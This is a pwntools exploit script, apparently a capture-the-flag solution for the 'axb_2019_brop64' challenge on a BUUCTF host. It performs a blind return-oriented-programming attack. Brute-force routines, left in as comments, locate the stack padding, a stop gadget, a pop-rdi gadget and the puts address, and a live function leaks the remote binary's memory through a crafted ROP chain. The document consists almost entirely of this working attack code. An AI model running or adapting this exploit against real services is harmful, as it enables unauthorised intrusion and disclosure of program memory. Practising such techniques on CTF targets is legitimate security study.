from pwn import *

url = 'node4.buuoj.cn'
port = 28636


# def Force_find_padding():
#     padding_length = 0
#     while True:
#         try:
#             padding_length = padding_length + 1
#             p = remote(url, port)
#             # p = process('./axb_2019_brop64')
#             p.recvuntil(b'Please tell me:')
#             p.send(b'a'*padding_length)
#             if b"Goodbye!" not in p.recvall():
#                 raise ("程序异常退出")
#             else:
#                 log.success('padding length ' + str(padding_length - 1) + ' is false')
#             p.close()
#         except:
#             log.success('The true padding length is '+str(padding_length-1))
#             return padding_length
#     log.error("We don't find true padding length!")
#
# padding_length = Force_find_padding()

padding_length=216
# #上面找偏移的代码比较通用，只要换一下返回语句就行，下面的主要是因为远程会返回输入值
# #所以一直覆盖到ebp就可以把return main函数的地址打印出来
# p = remote(url, port)
# p.recvuntil(b"Please tell me:")
# p.send(b'A' * padding_length)
# p.recvuntil(b'A' * padding_length)
# old_return_addr=u64(p.recvuntil(b'Goodbye!',drop=True).ljust(8,b'\x00'))
# log.info('The old return address is '+ hex(old_return_addr))
# #The old return address is 0x400834
# # 得到程序的基址0x400000
base = 0x400000

# # 此处我们希望我们能够爆破出main函数的首地址，进而直接让程序回到main函数进行执行
# def Find_stop_gadget(old_return_addr,padding_length):
#     maybe_low_byte=0x0000
#     while True:
#         try:
#             p = remote(url, port)
#             # p = process("./axb_2019_brop64")
#             p.recvuntil(b"Please tell me:")
#             p.send(b'a' * padding_length + p16(maybe_low_byte))
#             if maybe_low_byte > 0xFFFF:
#                 log.error("All low byte is wrong!")
#             if b"Hello" in p.recvall(timeout=1):
#                 log.success("We found a stop gadget is " + hex(old_return_addr+maybe_low_byte))
#                 return (old_return_addr+padding_length)
#             else:
#                 log.success('the addr ' + hex(old_return_addr+maybe_low_byte) + ' is false')
#             maybe_low_byte=maybe_low_byte+1
#         except:
#             pass
#             p.close()
#
# stop_gadget=Find_stop_gadget(base,padding_length)
# # We found a stop gadget is 0x4007d6
stop_gadget = 0x4007d6

# def get_brop_gadget(libc_csu_init_address_maybe,padding_length,stop_gadget):
#     maybe_low_byte=0x0000
#     while True:
#         try:
#             p = remote(url, port)
#             # p = process("./axb_2019_brop64")
#             payload  = b'A' * padding_length
#             payload += p64(libc_csu_init_address_maybe+maybe_low_byte)
#             payload += p64(0) * 6
#             payload += p64(stop_gadget) + p64(0) * 10
#             p.recvuntil(b"Please tell me:")
#             p.send(payload)
#             if maybe_low_byte > 0xFFFF:
#                 log.error("All low byte is wrong!")
#             if b"Hello" in p.recvall(timeout=1):
#                 log.success("We found a brop gadget is " + hex(libc_csu_init_address_maybe+maybe_low_byte))
#                 return (libc_csu_init_address_maybe+maybe_low_byte)
#             else:
#                 log.success('the addr ' + hex(libc_csu_init_address_maybe+maybe_low_byte) + ' is false')
#             maybe_low_byte=maybe_low_byte+1
#         except:
#             pass
#             p.close()
#
# brop_gadget = get_brop_gadget(base,padding_length,stop_gadget)
# # We found a brop gadget is 0x40095a

brop_gadget = 0x40095a

# def get_puts_addr(base, length, brop_gadget, stop_gadget):
#     addr = base
#     rdi_ret = brop_gadget + 9
#     while True:
#         try:
#             p = remote(url, port)
#             # p = process("./axb_2019_brop64")
#             payload = b'a'*length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
#             p.recvuntil(b"Please tell me:")
#             p.send(payload)
#             if b'ELF' in p.recvall(timeout=1):
#                 log.success("We found puts addr is " + hex(addr))
#                 return hex(addr)
#             addr += 1
#         except:
#             pass
#             p.close()
# puts_addr=get_puts_addr(base, padding_length, brop_gadget, stop_gadget)
# # We found puts addr is 0x400635

puts_addr = 0x400635

def dump_file(base, func_plt, padding_length, stop_gadget, brop_gadget):
    process_old_had_received_length = 0
    process_now_had_received_length = 0
    file_content = b""
    while True:
        try:
            p = remote(url, port)
            while True:
                payload = b'A' * (padding_length - len(b'Begin_leak----->'))
                payload += b'Begin_leak----->'
                payload += p64(brop_gadget+9) # pop rdi;ret;
                payload += p64(base+process_now_had_received_length)
                payload += p64(func_plt)
                payload += p64(stop_gadget)
                p.recvuntil(b"Please tell me:")
                p.send(payload)
                p.recvuntil(b'Begin_leak----->' + p64(brop_gadget + 9).strip(b'\x00'))
                received_data = p.recvuntil(b'\x0AHello')[:-6]
                if len(received_data) == 0:
                    file_content += b'\x00'
                    process_now_had_received_length += 1
                else:
                    file_content += received_data
                    process_now_had_received_length += len(received_data)
                log.info("leaking :" + hex(base+process_now_had_received_length))
        except:
            if process_now_had_received_length == process_old_had_received_length :
                log.info('We get ' + str(process_old_had_received_length) +' byte file!')
                with open('dump','wb') as fout:
                    fout.write(file_content)
                return
            process_old_had_received_length = process_now_had_received_length
            p.close()
            pass
dump_file(base, puts_addr,padding_length,stop_gadget,brop_gadget)